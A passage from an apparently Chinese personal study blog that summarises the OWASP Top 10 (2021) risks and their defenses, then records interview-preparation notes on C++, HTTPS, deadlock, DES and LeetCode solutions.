修改元数据，例如JSON Web Token（JWT）的重放或伪造，cookie或隐藏元数据字段的伪造，从而进行提权； CORS（跨域资源共享）配置不当，从而导致未授权的API调用； 在未登录状态下通过目录遍历找到了需要登录才能访问的界面，或同理找到了管理员界面。 防护措施 ：\n只开放公共资源，其余资源默认禁止访问； 只实现一种访问控制机制，贯彻落实到整个应用中； 访问控制模型要明确每一条记录的拥有者，不允许用户随便创建、读取、更新、删除记录； 记录失败的访问控制，并及时告警。 2 Cryptographic Failures 密码算法失效 旧称 敏感数据泄露 ，是原榜单的 No. 3 ，现在来到了第二位。敏感数据泄露是现象而非本质，新版本将其表达修改为更加接近问题根源的形式。\n人们总是需要考虑数据传输、存储、处理过程中的保护需求，诸如口令、信用卡号、个人信息等数据需要提供额外的保护；一般来说，只要是法律规定的敏感数据都需要进行严密的保护。参照欧盟的GDPR、金融业的PCI DSS等文件，数据保护要考虑如下的问题：\n数据明文明文传输问题； 在默认配置或较老的代码中使用了脆弱的密码算法； 使用了默认的/脆弱的/重复使用的密钥，或密钥没有得到妥善的保管； 没有强制进行加密； 客户端没有对服务端证书进行验证。 防护措施 ：\n对没必要存储的敏感数据予以及时销毁，存储的敏感数据确保加密。 使用最新的、强大的算法、协议、密钥，且密钥妥善管理。 确保数据传输过程中受到加密保护，如使用HSTS。 3 Injection 2017版本的OWASP Top10将注入漏洞排在第一位，因此相信很多人都对此有所了解。\n以下的情况可能导致注入漏洞的出现：\n用户提供的数据没有经过应用程序的验证、过滤； 未经过转义就将动态请求或非参数化的API调用放入解释器执行； 恶意数据被直接使用或拼接使用。 防护措施 ：\n将数据和可执行的命令/查询语句分离。 使用安全的API，避免完全使用解释器，提供参数化的API调用方式。 对输入设置白名单，或进行输入验证。 转义特殊字符。 在查询中使用 LIMIT 或其他SQL控件，防止SQL注入时大量地泄露记录。 4 Insecure Design 你从未见过的船新种类\n新版本中新增的 Insecure Design 主要关注由程序设计和架构上的缺陷所引起的安全风险，由此建议人们更多地在工程中使用对威胁进行建模，使用安全的设计模式和参考架构。\n不安全设计 其实是一个较为宽泛的类型，其下包含若干常见的脆弱点，但基本可以归纳为“缺失或无效的控制设计”（missing or ineffective control design）。\n防护措施 ：\n与安全专家一起建立并使用安全的开发流程，对现有的安全或敏感数据相关的控制措施进行评估。 在安全的模式下构建并使用库/组件。 对重要的认证、访问控制、业务逻辑、关键流程等模块进行 威胁建模 。 编写单元和集成测试，以验证所有关键流程是否能够抵抗威胁。 5 Security Misconfiguration 不安全的配置 是原榜单的 No. 6 ，现在上升了一位。随着软件的可配置性逐渐变强，这一安全问题的加剧也就不足为奇了。\n应用中常见的不安全配置有：\n云服务中的权限配置错误； 安装或启用了不必要的特性（如非必要的服务、端口、页面、账号）； 仍在使用默认的账号或密码； 把应用的报错信息泄露给了用户； 系统升级之后没有及时启用新的安全特性； 没有在开发/服务框架中配置好安全属性； 服务端没有向客户端发送安全相关的指令或消息头； 使用了不安全的组件。 防护措施 ：\n实施安全的安装过程，如开发、测试、生产环境中保持相同安全配置，且口令不同。安装过程尽量自动化，以减小出错的可能。 搭建最小化平台，移除所有不必要的功能、组件、文件及示例。 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分。检查过程中，特别注意云存储的权限。 向客户端发送安全指令，如安全标头（想到了CSP、HTTP-Only）。 6 Vulnerable and Outdated Components 存在漏洞的或过时的组件 旧称 使用含有已知漏洞的组件 ，原榜单排第九。在行业调查中，这一安全问题收到了 第二多 的反馈。\n这一问题一般出现在：\n对自己使用的组件或依赖的组件的版本没有清晰的认知； 依赖的组件或运行环境存在漏洞或过时（如OS、DBMS等）； 没有定期进行组件的漏洞检测，没有关注组件开发者发布的安全公告； 没有修复或升级底层依赖； 没有对新组建的适配性进行测试； 没有对组件进行妥善的安全配置（见上一个问题）。 防护措施 ：\n移除不使用的依赖、不需要的功能、组件、文档。 利用各种工具来持续记录客户端和服务端以及它们的依赖库的版本信息。持续监控CVE等信息来判断已有组件是否有漏洞。 使用官方渠道安全地获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险。 监控那些不再维护或不发布安全补丁的库和组件。 7 Identification and Authentication Failures 身份认证和授权失败 旧称 失效的身份认证 ，由原榜 No. 2 下滑到第7位。\n对用户身份的认证和授权是非常关键的过程，假如应用中存在如下的问题，则可能导致认证机制的失效：\n不对暴力破解或其他自动化的身份认证攻击进行防御； 允许弱口令的存在； 使用不安全的口令找回机制，使得攻击者可以获取或重置用户口令； 使用明文或不安全的密码哈希算法（见旧版 敏感数据泄露 或新版 密码算法失效 ）； 没有使用或使用了脆弱的多因素认证； 没有妥善处理会话ID。包括：在URL中暴露了会话ID，或用户登录之后没有生成新的会话ID，或用户注销之后没有及时销毁会话ID。 防护措施 ：\n多因素身份认证。 弱口令检查。 统一注册、凭据恢复等接口，防止用户枚举攻击。 会话ID的合理管理，如登录之后生成高度随机的会话ID、妥善存储（肯定不能出现在URL里……）、登出之后及时销毁。 8 Software and Data Integrity Failures 新类别~\n我们经常能遇到一些与软件更新或某部分重要数据密切相关的操作，而假如这些操作不对软件和数据完整性进行验证，就会出现问题。一个很好的例子是旧版排名 No. 8 的问题——不安全的反序列化，它实际上属于该类别的一部分。\n该问题通常由于代码或架构中没有对软件/数据完整性进行检查，比如程序中使用了来自不受信源的插件、模块或库。近年来，许多程序都集成了自动更新功能，这些更新内容被下载之后没有进行周到的完整性检查，就被应用在了原本受信的程序上；攻击者可能会发布一个恶意更新，并使得这些更新被所有安装了原程序的机器运行。\n防护措施 ：\n使用数字签名或其他类似的机制来保证软件或数据的来源是可信的，且传输过程中并未受到篡改； 确保你使用的管理和构建工具（如Maven）是从可信的仓库下载依赖； 使用软件供应链安全检查工具，如 OWASP Dependency Check 或 OWASP CycloneDX ，来确保项目使用的组件中没有已知漏洞； 建立一个 review 机制来对代码或配置的变更进行审查，防止不安全的变更被引入项目流水线中； 不要将未签名或未加密的序列化数据发送给不受信的客户端，防止恶意客户端篡改或重放序列化数据。 9 Security Logging and Monitoring Failures 日志和监控不足 由原版第十位上升来到第九位。日志和审计数据的重要性不言而喻，它们是攻击溯源、账号审计、告警和响应等安全功能的重要依赖。\n日志和监控不足的问题一般可能发生在如下的场景：\n有些事件应被审计，但并未被审计（如登录成功、登录失败）； 系统确实产生了告警或报错，但是这些消息呈现的信息不够清晰； 应用日志和API日志没有受到实时的监控，由此不能及时发现可疑行为； 日志没有妥善存储； 告警阈值和响应启动的过程没有设置到位； 渗透测试或扫描工具发起的扫描行为没能触发告警； 程序不能够对攻击行为进行实时或及时的告警、响应、处置。 对于这些日志和监控信息，最好还要制定适当的访问控制权限，否则也可能存在风险。\n防护措施 ：\n确保所有登录、访问控制和服务端的输入验证失败信息都受到了记录，且这些记录需要带有完整的用户上下文信息，以定位可疑账号；同时，这些记录要存留足够长的事件，以便后续的分析； 确保日志格式易于处理，尤其是让自动化的日志管理工具处理（宣传一波TxSOC）； 确保日志数据被正确地编码，防止针对日志和监控系统的注入攻击； 确保高额交易有完整性控制的审计信息，且审计信息必须防止篡改或删除； 制定应急管理预案，保障事件的有序响应和恢复。 10 Server Side Request Forgery（SSRF） OHHHHHHHH\n面试常客了，同时也是业界反馈第一高的问题，但在这一轮的测试过程中没有出现很广泛的SSRF问题。这种新条目覆盖的面一般较小，主要是为了引起人们的关注和认知，后续可能扩大成更广一点的类别。\n当一个网站后端使用用户提供的URL来获取远程资源，且未对这一URL进行检查时，就可能发生SSRF。这一漏洞使得后端服务器被攻击者用来向我们不希望的目标发送恶意请求，且这种请求可以绕过WAF、VPN和其他类型的ACL。\n当前的Web应用都在向用户提供越来越多的方便功能，包括从用户侧获取URL，这使得SSRF的出现概率在不断增加；同时，随着云计算的发展和程序架构的复杂化，SSRF的严重性也在不断增加。\n防护措施 ：\n网络层\n对内网进行划分，尤其是具有远程资源访问功能的部分，以减轻SSRF带来的影响； 防火墙上配置“默认拒绝”的规则，只放行一些必要的请求； 应用层\n检查来自客户端的所有输入数据； 对URL格式、端口和目的地址设置一个白名单； 不把原始数据返回给客户端（即远程获取到的资源要进行处理）； 禁用HTTP重定向； 留意URL的有效时间，防止DNS重绑定或TOUTOC（time of use, time of check）竞争条件攻击； 不要用黑名单来防止SSRF，因为攻击者有很多种办法绕过它们。\n","date":"2021-09-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/owasp-top102021/","title":"OWASP Top10（2021）"},{"content":"2021-07-20，正式拉开了秋招备战的序幕。\n我一直以来都深以为然的一个句子是，人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。 这个句子的意思是，如果你的学习能力比不上他人，那就花费百倍的精力去学，能够做到这一点的人，即使是一个愚者，也能够明了很多的知识。\n1 C++引用和指针的区别 这个问题出现在昨天的面试中，在此予以学习和记录。\n指针： 指针是一个变量，用于保存另一个变量的地址。指针需要使用 * 来进行解引用，以获取它指向的内存地址上的内容。\n引用： 引用是一个 已经存在 的变量的别名，实际上，引用也是通过存储变量的地址来进行实现的。\n两者的区别有如下几点：\n初始化的方式不同。指针可以先声明，后赋值；引用必须在声明的同时进行初始化，因为它必须作为一个已经存在的变量的别名。\n重复赋值。指针可以重复赋值（当然，const指针不行），而引用一旦声明，就不可以重复赋值。\n内存占用。指针在栈上有其独立的内存空间（32bit机器就占用4字节），而引用与它的初始变量共享同一个空间，虽然它还是会花掉一部分栈空间。\n是否为空。指针可以设置为NULL，而引用不行（基于第一点和第二点区别）。\n间接引用。指针可以有多重嵌套，而引用不行。\nIn Pointers, int a = 10; int *p; int **q; //it is valid. p = \u0026amp;a; q = \u0026amp;p; // Whereas in references, int \u0026amp;p = a; int \u0026amp;\u0026amp;q = p; //it is reference to reference, so it is an error. 可以使用一句话来概括两者在实际使用中的规律：只在万不得已的时候使用指针。一般来说，引用会用在一个类的public接口中，而指针运用在其内部。\n以下编辑于2021-07-25\n传引用比传指针安全。 因为不存在空引用，并且引用一旦被初始化为指向一个对象，就不会被改变为另一个对象的引用；而指针可能被改变为另一个对象。\n即使声明为常量指针 const Type* ，仍可能为空指针，并且可能产生野指针，所以还是不安全。\nReference\n[1] Pointers vs References in C++ - GeeksforGeeks\n[2] 【C++】C++常见面试题汇总_持续更新中\u0026hellip; - 知乎 (zhihu.com)\n2 HTTPS流程 HTTPS的流程总结为如下步骤：\n客户端向服务器发送自己支持的密码套件（cipher suit）和一个随机数 rc ； 服务端选择一套密码算法，连同自己的证书信息返回给客户端。在这里，服务端具体会将自己的公钥、数字证书、签名以及一个随机数 rs 等信息发送给客户端； 客户端接受服务端的证书之后，会根据 rc 和 rs 生成一个随机的对称秘钥，同理，服务器此时也会生成相同的对称秘钥； 双方加密通信。 以下于2021-07-24重编辑\n还有一种对HTTPS流程的描述是：\n客户端向服务器发送自己支持的密码套件（cipher suit）； 服务端选择一套密码算法，连同自己的证书信息返回给客户端。在这里，服务端具体会将自己的公钥、数字证书、签名等信息发送给客户端； 客户端接受服务端的证书之后，会生成一个随机的对称秘钥，用服务端的公钥加密后发送给服务端；服务端收到消息之后可以解密得到对称秘钥； 双方加密通信。 实际上，这两种描述所不同的地方仅在于一个关键的步骤：密钥交换。\n在第一种描述中，表现的是名为 DHE(Diffie-Hellman Exchange) 的密钥交换方式，而第二种描述中，表现的是名为 RSA密钥交换 的方式。第二种描述的实现方法法非常简单，但假如服务端的私钥被破解，将可以解密此前截取的所有流量，即这种办法不具备 前向安全 性。\nReference\n[1] 让面试官膜拜你的HTTPS运行流程（超详细） - 知乎 (zhihu.com)\n[2] HTTPS原理和通信流程 - 知乎 (zhihu.com)\n[3] 石瑞生.大数据安全CH02-03-安全基础知识.2020年秋季学期.BUPT\n[4] 《HTTPS权威指南》笔记-密钥交换 - 简书 (jianshu.com)\n昨天工作累爆，没有学习，今天休息，补上~\n3 死锁 昨天遇到的面试题，答得还算可以，但是有一些点还是忘了。死锁也是网上各个面经的常客了，稍作梳理，不亏。\n3.1 定义 操作系统中往往有多个进程在并发执行，而所谓死锁，是指多个进程因竞争资源而造成的一种僵局（互相等待），若无外力作用，这些进程都将无法向前推进。\n3.2 死锁产生的原因和必要条件 （1）系统资源的竞争\n通常系统中拥有的不可剥夺资源，数量不足以满足多个进程运行的需要。若进程在运行中因为对不可剥夺资源的竞争而陷入僵局，就可能产生死锁。对可剥夺资源的竞争是不会引起死锁的。\n（2）进程的推进顺序非法\n进程在运行过程中，请求和释放资源的顺序不当，也同样会导致死锁。\n信号量使用不当也会造成死锁。\n（3）死锁产生的必要条件\n昨天面试的时候短路遗忘的知识点（小声）。\n产生死锁必须同时满足4个条件，只要其中一个不成立，死锁就不会产生。\n互斥条件。如果某个资源无需互斥访问，自然就不存在对它的竞争了。\n不剥夺条件。\n请求和保持条件。进程已经保持了至少一个资源，而在提出新的资源请求的时候，该资源已被其他进程占用，此时当前进程被阻塞；但是它对自己已经获得的资源保持不放。\n我理解这一条件和不剥夺条件的区别是，请求和保持条件允许进程可以保持资源不放，但是其他进程可能强行剥夺；如果你保持不放，且外人不能剥夺的话，就可能陷入僵局。\n循环等待条件。存在一种进程资源的循环等待链，链中每个进程已获得的资源同时被链中下一个进程所请求。直观上看，循环等待条件似乎和死锁的定义一样，其实不然。按死锁定义所构成的等待环要求的条件更严格，它要求 Pi 等待的资源必须由 Pi+1 来满足，循环等待条件则无此限制。例如，系统中有两台设备， P0 占有一台， Pk 占有一台， Pn 请求这一设备，则这一设备可以从 P0 处获得，也可以从 Pk 处获得；虽然 P0 到 Pn 构成了一个等待圈，但等待圈外的设备 Pk 只要释放了这一设备，就打破了等待。因此，循环等待条件只是死锁的必要条件。\n3.3 死锁的处理策略 （1）死锁预防\n打破四个必要条件中的某一个，即可完全防止死锁的出现。\n（2）死锁避免\n注意“避免”和“预防”的区别。\n在资源的动态分配过程中，采用某种方法（如银行家算法）来防止系统进入不安全状态，从而避免死锁。\n（3）死锁的检测和解除\n事先不采取任何限制性措施，允许进程在运行过程中发生死锁。通过系统的检测机构及时地检测出死锁的发生，然后采取某些措施解除死锁（剥夺资源、杀死进程、进程回退）。\n周末是如此的Relaxed，今天又只记录了一个知识点，睡觉去也~\nReference\n[1] 王道论坛.2021年操作系统考研复习指导[M].北京:电子工业出版社,2020:129::131\n基本上一整天都在弄博客样式，折腾来折腾去，没有太大的改观······\n4 malloc和new的区别 C++经典问题之一。\n（1）是否调用构造函数。 malloc 为一个对象申请空间时，不会自动调用它的构造函数；而 new 会自动调用构造函数。同时，使用 new 申请一个对象数组时，会对每一个单元进行构造函数的调用，如下所示：\nA* ptr = new A[10];\t// 对每一个对象调用构造函数 delete[] ptr;\t// new数组的时候要搭配 delete[] （2）一个是函数，一个是运算符（operator new）。 malloc 虽然是函数，但是它不允许重载；而 new 可以被重载。\n（3）返回类型不同。 malloc 返回一个 void* 类型的指针，指向申请的那块空间；而 new 返回的是一个 确切的 对象指针。\n（4）错误处理。 malloc 申请内存失败之后，会返回一个空指针 NULL ；而 new 申请内存失败后，会抛出 bad_alloc 异常。\n（5）内存区域。 malloc 从堆中申请内存；而 new 会从 自由存储区（free store） 上申请内存。自由存储区是C++基于new操作符的一个抽象概念，凡是通过new操作符进行内存申请，该内存即为自由存储区。自由存储区的具体性质，取决于 new 运算符的实现方式，它本身也可以是堆。\n（6）申请的大小。 malloc 需要调用者传入要申请的内存大小；而 new 申请的空间大小由编译器自动计算。\n（7）更改大小。 malloc 允许通过 realloc() 函数更改缓冲区大小，假如要将缓冲区变大，系统会分配一块更大的空间，然后将当前缓冲区中的内容复制过去；而 new 不允许更改申请到的缓冲区的大小。\nReference\n[1] malloc() vs new - GeeksforGeeks\n[2] c++ new 与malloc有什么区别 - ywliao - 博客园 (cnblogs.com)\n5 虚函数 虚函数一般在继承的场景下发挥作用。基类声明一个虚函数，子类重载这一函数，这样一来，当我们使用一个基类指针指向子类，并且希望调用这一函数的时候，得到的就是子类重载过的函数。\n实际上，虚函数的意义就在于能够使得函数调用合乎逻辑，而不必考虑指针的类型。\n虚函数的解析在运行的时候完成。\n以下有几个虚函数的使用原则：\n不能是 static 函数； 可以是其他类的友元函数； 使用基类指针或者引用来调用虚函数，以获得 运行时多态（run time polymorphism） ； 一般在基类定义、子类重载，但没有强制要求子类进行重载，在这种情况下，就和普通的函数继承没有区别； 可以有 虚析构函数（virtual destructor） ，但不能有 虚构造函数（virtual constructor） 。 夜已深了，且先休息去，来日再作补充~\nReference\n[1] Virtual Function in C++ - GeeksforGeeks\n2021-07-26 今天做题，学习了 【最长递增子序列】 的解法、之后AC了一道困难题！准备新开一篇难题本讲讲这道题： 1713. 得到子序列的最少操作次数 - 力扣（LeetCode） (leetcode-cn.com)\n所以就鸽了鸽了~\n2021-07-27 今天投简历，改完之后夜深了；明天留公司，估计也没有新的知识点学习。希望昨天说的文章能尽快完成吧。\n既然啥知识点都没学，就简单讲一下每日一题吧。今天的每日一题是 671. 二叉树中第二小的节点 - 力扣（LeetCode） (leetcode-cn.com)\n如何找到【第二小】的节点，下午折腾了一段时间；晚上回来，稍作考虑，可以直接使用排序+遍历的方法，找到第一个与左邻居不同的元素即可。\n两次遍历的情况有一点问题，测试用例有一组 [2,2,2147483647] ，用 INT_MAX 初始化答案，找最小值的办法是行不通的，出题人属实很有水平。\n答案里还有人直接使用 set ，属于是把STL玩明白了，我以后也要好好再学一下STL o(╥﹏╥)o\n2021-07-28 今天公司留宿，不更新是理所当然的吧~ 今日的每日一题是 https://leetcode-cn.com/problems/all-nodes-distance-k-in-binary-tree/ ，中等题，一时间没有思路；看了题解之后发现二叉树可以转为图，这样就比较简单了。 一开始想用邻接矩阵，但是一个节点实际上只可能有三条边，那就使用dfs先存下这个节点的父节点，这样一个节点的所有邻居就全都可以找到了（两个子节点加上一个父节点，最多只有三个邻居）；构造完了一个抽象意义上的“图”，使用BFS找目标距离的节点即可。\n2021-07-29 谌龙翻盘李梓嘉！姜还是老的辣！\n今天的知识点启发于白天的工作中，实际上并不是非常的重要，仅稍作记录。\n6 FTP与SFTP FTP 是文件传输协议（File Transport Protocol）的简写，使用 C/S 架构在web服务器和FTP客户端之间进行文件传输。FTP使用两个独立的连接，分别是命令连接和数据连接，前者用于传输指令，后者用于传输数据（文件）。实际上，双连接的机制在使用socket编程来实现文件传输功能时，是非常有意义的：当服务器发送完文件之后，可以直接关闭文件连接的socket，这样命令连接就知道文件传输已经完成，可以进行下一步工作了。\n默认情况下，FTP没有加密，也就意味着 中间人攻击 的可能性。\nSFTP 是SSH File Transport Protocol的简写，或者也被成为Secure File Transport Protocol。它提供与FTP一样的功能，但基于SSH而非C/S架构的FTP实现。SFTP只使用一个连接，并要求用户使用用户名/密码或者SSH密钥的方式进行授权。\n由于实现方式的不同，FTP使用的端口是传统的21，而SFTP使用与SSH相同的22端口。\n[1] FTP vs SFTP: What\u0026rsquo;s the Difference? Which One Should You Use? (kinsta.com)\n7 LeetCode 987. 二叉树的垂序遍历 因不可抗力断更，昨天重感冒了······\n今天仍然没好，仅对每日一题进行记录。\n今天的每日一题是 987. 二叉树的垂序遍历 - 力扣（LeetCode） (leetcode-cn.com)\n题目给的数据属于是少了，针对一千个二叉树节点，我们使用一个 multimap 来进行 列 → Node 的映射，注意这里的 Node 指的是自定义的数据结构：\ntypedef struct _node { int val; int row; } Node, *PNode; 我们使用 multimap 来将某个列上的所有节点存储起来，使用 Node 来记录节点所在的行和值。这样，我们遍历完成之后得到的 multimap 就能够根据一个列值取出这一列上的所有节点；我们利用这些 Node 的行和值进行排序，正如题意所说的：\n二叉树的 垂序遍历 从最左边的列开始直到最右边的列结束，按列索引每一列上的所有结点，形成一个按出现位置从上到下排序的有序列表。如果同行同列上有多个结点，则按结点的值从小到大进行排序。\n这里注意 multimap 的几个用法：\nmultimap.emplace(key, value); // 插入值 multimap.equal_range(key); // 返回key值对应的所有value，返回值是一个pair，首元素是区间起点，次元素是区间终点的后面 独立自主完成的困难题，AC代码还是要贴一下~\n/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */ class Solution { public: typedef struct _node { int val; int row; } Node, *PNode; multimap\u0026lt;int, Node\u0026gt; col2node; void dfs(TreeNode* root, int row, int col) { Node n; n.val = root-\u0026gt;val; n.row = row; col2node.emplace(col, n); if (root-\u0026gt;left) dfs(root-\u0026gt;left, row + 1, col - 1); if (root-\u0026gt;right) dfs(root-\u0026gt;right, row + 1, col + 1); } static bool cmp(Node\u0026amp; a, Node\u0026amp; b) { if (a.row \u0026lt; b.row) return true; else if (a.row == b.row) return a.val \u0026lt; b.val; else return false; } vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; verticalTraversal(TreeNode* root) { dfs(root, 0, 0); vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; for (int c = -1000; c \u0026lt;= 1000; c++) { if (col2node.count(c)) { auto ret = col2node.equal_range(c); vector\u0026lt;Node\u0026gt; sortedNodes; vector\u0026lt;int\u0026gt; tmp; for (auto a = ret.first; a != ret.second; a++) { sortedNodes.push_back(a-\u0026gt;second); } sort(sortedNodes.begin(), sortedNodes.end(), cmp); for (auto n : sortedNodes) { tmp.push_back(n.val); } res.push_back(tmp); } } return res; } }; 2021-08-01 建军节，伟大的人民军队万岁！\n8 C++中的static关键字 我们知道，函数的局部变量空间分配在栈上，函数运行结束之后这些变量的空间就会被释放掉；当我们需要保存函数上一次调用时变量的状态，就需要将这个变量放到另一块存储空间上，这就是 static 关键字的作用。\nstatic 变量存储在静态存储区，在程序结束之前都不会被释放。即使一个函数被多次调用，其中的 static 变量也始终只进行了一次内存分配，且它的值可以保持上一次调用时的样子。\nstatic 关键字用于定义一个类中的成员变量的时候，有其独特的影响。由于 static 变量存储在一块独立的区域，所有类对象都共享这一个变量。如以下的例子所示，所有 GfG 类型的实例都共享 static 变量 i 。\n// C++ program to demonstrate static // variables inside a class #include\u0026lt;iostream\u0026gt; using namespace std; class GfG { public: static int i; GfG() { // Do nothing }; }; int main() { GfG obj1; GfG obj2; obj1.i =2; obj2.i = 3; // prints value of i cout \u0026lt;\u0026lt; obj1.i\u0026lt;\u0026lt;\u0026#34; \u0026#34;\u0026lt;\u0026lt;obj2.i; // Get 3 } 正因如此， 不允许在类的构造函数中对 static 类型的成员变量进行操作 。类中的 static 变量应该由用户在外部使用作用域运算符进行赋值。\n如 int GfG::i = 1; 。\n由以上的分析我们可以进一步推理，static 类型的类对象也具有全局的生命力，它的析构函数只会在程序结束的时候被调用。\n再进一步推理，static 类型的函数也具有全局的生命力，当然，对函数讨论“生命力”没什么意义。\n在一个类中， static 类型的成员函数正如 static 类型的成员变量那样，被所有对象（实例）所共享。我们可以使用 className.functionName 的形式来调用这个函数，不过还是首推作用域运算符 className::functionName 的方式来进行调用。由于所有的实例都共享这么一个 static 函数，它自然只能访问 static 类型的成员变量，或者其他 static 类型的成员函数；设想，所有的实例都来调用这个函数，然后它去访问一个非全局共享的变量，那么这个函数怎么知道这个变量应该属于哪个实例的呢？\nReference\n[1] 【C++】C++常见面试题汇总_持续更新中\u0026hellip; - 知乎 (zhihu.com)\n[2] Static Keyword in C++ - GeeksforGeeks\n9 分组密码——DES 9.1 简介 分组密码（块密码）是将明文消息编码表示后的二进制序列，划分成固定大小的块，每块分别在密钥的控制下变换成等长的二进制序列。\n注意，尽管一些传统加密算法也进行分组，但它们并不是分组密码。例如，Vigenere加密算法的密钥也可以自定义块的大小，但它不属于分组密码。\n分组密码加解密的设计有如下几个要求：\n分组足够长。 根据分组长度 n ，每一组中的元素个数 2^n 要足够对抗明文穷举攻击。 密钥长度足够长。 密钥长度 k ，则密钥有 2^k 种情况，需要足够对抗密钥穷举攻击。但密钥长度不能太长，否则不利于管理和加解密速度。 置换算法足够复杂。 置换算法要足以对抗差分攻击和线性攻击等，使得攻击者只能进行穷举。 加解密运算简单，利于硬件实现。 一般无数据扩展，即明文和密文长度相同。 Shannon提出了三个分组密码的设计思想——混乱、扩散和乘积密码。\n混乱。 可以理解为”搅拌机“，指在加密过程中明文、密钥以及密文之间的关系尽可能复杂，以防密码破译者采用统计分析法进行破译攻击。 扩散。 每1比特明文的变化尽可能多地影响到输出密文序列的比特，以便隐藏明文的统计特性。扩散的另一层意思是每1位密钥也尽可能影响到较多的输出密文比特。简而言之，扩散就是希望密文中的任一比特都要尽可能与明文和密钥的每一比特相关联。 乘积密码体制。 针对嵌套加密的一系列原则。此处省略。 9.2 分组密码的迭代结构 分组密码有两种迭代结构：Feistel网络结构和SP网络结构。\nFeistel网络结构的加密办法如下：\n将明文分组分割成长度相同的两块：(L0, R0)\n对每一轮，i=0,1,\u0026hellip;n\nLi+1 = Ri\nRi+1 = Li ⊕ F(Ri, Ki)\n加密后的密文为 (Rn+1, Ln+1)\n解密办法与加密办法相反：\n对于密文(Rn+1, Ln+1)，每一轮 i=n,n-1,\u0026hellip;0\nRi = Li+1\nLi = Ri+1 ⊕ F(Li+1, Ki)\n解密出 (L0, R0)\nSP网络结构是代换-置换网络的简写。它由两个基本组件S盒和P盒组成。S盒进行代换操作，起到混乱作用；P盒进行置换操作，起到扩散作用。每一轮迭代中都先经过S盒、再经过P盒。\n需要注意，置换不等于扩散。置换本身并不改变明文在单个字符或置换分组上的统计特性。但是，经过了多轮代换-置换的结合，就产生了扩散作用。\n9.3 DES DES的初始密钥长度为64位，但有效密钥为56位，其中第8/16/24/32/40/48/56位是奇偶校验位。\n流程如下图所示：\nDES DES的初始置换Initial Permutation是固定的，它的作用是将原明文块的位进行换位。完成加密之后，要使用它的逆置换将其换回来，置换表如图所示：\nDES IP DES一轮迭代过程如图所示，其遵循了Feistel网络结构，轮函数总共经历了扩展置换-密钥加-非线性代换-线性置换四个步骤。\nDES Round 扩展置换又称E盒，将32位输入扩展为48位输出。E盒在DES算法上最基本地是要将输入扩展为与轮密钥相同的48比特，而更进一步，由于E盒的1位输入可能影响2个S盒的输入，能够更快地实现血崩效应。\n代换盒又称S盒，是DES中唯一的非线性部分。经过S盒的代换，E盒扩展生成的48位数又压缩回32位。\n最后的P盒没有太多探讨的意义，就是一个32位的置换表。\nDES的密钥编排如下图所示，首先将64位密钥进行PC-1置换，然后根据轮数进行左移，其中，第1/2/9/16只移动1位，其余轮数移动2位。最后，56位密钥经过PC-2置换得到48位密钥。\nDES Key Generation 关于DES的安全性问题，暂且不予记录了~\n10 笔试复盘 晚上参加了Shopee的笔试，果然安全拉胯，编程AK……\n编程题实际上也不难，第一题估计有个LeetCode的中等偏上，予以记录吧。\n有一个整数 n 和一个整数 k ，现在要将 n 分成 k 份，每份至少有一个元素，求总共有多少种分法。注意，分割的办法不考虑顺序，例如将 7 分成 3 份，其中 1,1,5 和 5,1,1 或 1,5,1 属于同一种分法。\n1 \u0026lt;= n \u0026lt;= 200 1 \u0026lt;= k \u0026lt;= 7 这题我使用了三维记忆化搜索，rec[n][k][startswith] 表示将 n 分成 k 份，每一份的元素至少要大于 startswith 。\n假设要将 7 分成 3 份，我们可以将其转化为将 6 分为 2 份，每份至少从 1 开始，或者将 5 分为两份，每份至少从 2 开始……\n不好解释，直接放代码：\n#include \u0026lt;vector\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; int record[210][8][210]; int d(int n, int k, int startswith) { // cout \u0026lt;\u0026lt; n \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; k \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; startswith \u0026lt;\u0026lt; endl; if (record[n][k][startswith]) return record[n][k][startswith]; if (startswith * k \u0026gt; n) return 0; if (k == 1) return 1; int res = 0; for (int start = startswith; start \u0026lt;= n / 2; start++) { res += d(n - start, k - 1, start); } record[n][k][startswith] = res; return res; } int divide(int n, int k) { // write code here return d(n, k, 1); } int main() { int n, k; n = 200; k = 7; cout \u0026lt;\u0026lt; divide(n, k) \u0026lt;\u0026lt; endl; system(\u0026#34;pause\u0026#34;); } 本场笔试也暴露出了一些安全理论上的缺陷，之后有空进行总结。今天就先到这里啦~\nReference\n[1] 谷利泽,郑世慧,杨义先.现代密码学教程（第2版）[M].北京:北京邮电大学出版社,2019\n2021-08-03 今天将昨天的笔试题整理了一下，还有些题目找不到答案，明天继续~\n2021-08-14 断更将近2周，陆续恢复吧……\n11 LeetCode 1583. 统计不开心的朋友 1583. 统计不开心的朋友 - 力扣（LeetCode） (leetcode-cn.com)\n今天的题目是个模拟题，然而我卡了半天没有做出来……\n这里的一个关键是建立二维映射 rank[x][y] 表示 y 在 x 心中的优先级，数值的话直接按照 preferences[x] 中 y 所处的下标即可。\n对于一个 x 来说，我们可以找到所有位于 rank[x][y] 之前的数 u ，即 x 心中比 y 更加优先匹配的对象，再找到 u 的现有对象 v ，比较 rank[u][x] 和 rank[u][v] 的大小。如果 rank[u][x] \u0026lt; rank[u][v] ，说明 u 也更希望和 x 进行匹配，那么依照题意， x 就是不开心的。\n之前对于不开心的理解，是 x 不开心，则 u 应该也不开心，这样就比较复杂了。我们只考虑 x 开不开心，把 u 放到之后进行考虑，反而简单一些。\n代码就不放了，WA了两次的中等题，我现在属实不怎么开心。\n12 LeetCode面试题 04.05. 合法二叉搜索树 https://leetcode-cn.com/problems/legal-binary-search-tree-lcci/\n这题属实顶不住了……出题人给那么多 INT_MAX 的测试用例干啥？？？\n希望检查一颗树是否是二叉搜索树，只需要考虑它的左节点是否满足一定范围、右节点是否满足一定范围，然后按照递归的思路向下进行，类似于深搜。\n初始情况下（即考虑根节点的时候），它的数据范围应该是 -INF ~ +INF 